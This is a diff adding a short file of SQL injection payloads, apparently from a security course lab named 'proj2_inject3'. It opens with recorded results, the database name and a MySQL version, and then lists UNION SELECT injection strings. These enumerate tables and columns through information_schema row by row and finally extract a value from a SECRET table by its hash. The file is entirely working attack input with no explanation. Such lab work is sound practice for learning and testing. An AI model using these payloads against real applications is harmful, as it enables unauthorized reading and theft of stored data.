@@ -1,0 +1,16 @@
+Database():proj2_inject3
+Version():First name: 5.5.60-0ubuntu0.14.04.1
+
+' and 1=2 union select 1, database(),3,4;#
+' and 1=2 union select 1, version(),3,4;#
+' and 1=2 union select 1,1,1,table_name FROM information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1;#
+' and 1=2 union select 1,1,1,table_name FROM information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1;#
+' and 1=2 union select 1,1,1,table_name FROM information_schema.TABLES where TABLE_SCHEMA=database() limit 2,1;#
+' and 1=2 union select 1,1,1,table_name FROM information_schema.TABLES where TABLE_SCHEMA=database() limit 3,1;#
+' and 1=2 union select 1,1,1,column_name FROM information_schema.COLUMNS where table_name='SECRET' limit 1 offset 0;#
+' and 1=2 union select 1,1,1,column_name FROM information_schema.COLUMNS where table_name='SECRET' limit 1 offset 1;#
+' and 1=2 union select 1,1,1,column_name FROM information_schema.COLUMNS where table_name='SECRET' limit 1 offset 2;#
+' and 1=2 union select 1,1,1,column_name FROM information_schema.COLUMNS where table_name='SECRET' limit 1 offset 3;#
+' and 1=2 union select 1,1,1,secret from SECRET where hash='453ff93453492c70ffced082e867c6f9';#
+
+
